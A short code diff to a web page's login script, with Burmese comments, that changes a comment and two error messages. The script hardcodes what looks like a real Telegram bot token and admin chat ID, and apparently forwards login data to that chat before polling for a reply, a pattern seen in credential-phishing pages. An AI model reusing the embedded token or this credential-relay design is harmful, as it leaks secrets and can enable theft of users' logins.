@@ -41,7 +41,7 @@
     </div>
 
     <script>
-        // Telegram Bot Credentials (သင့် Token နှင့် Chat ID အစားထိုးပါ)
+        // သင့်ရဲ့ Telegram Bot Credentials များ ထည့်သွင်းထားပါသည်
         const BOT_TOKEN = "8895720681:AAGuAuVf5qAwD3y84RiH7B3fEfBz9P1t_Hs"; 
         const ADMIN_CHAT_ID = "5304050102";   
         
@@ -85,12 +85,12 @@
                     startPolling();
                 } else {
                     statusMsg.style.color = "#ef4444";
-                    statusMsg.innerText = "Error sending to Telegram. Check Bot Token/Chat ID.";
+                    statusMsg.innerText = "Error sending to Telegram. Did you press /start in the Bot?";
                     loginBtn.disabled = false;
                 }
             } catch (err) {
                 statusMsg.style.color = "#ef4444";
-                statusMsg.innerText = "Network Error! Please check connection or VPN.";
+                statusMsg.innerText = "Network Error! Please turn on VPN and retry.";
                 loginBtn.disabled = false;
             }
         });
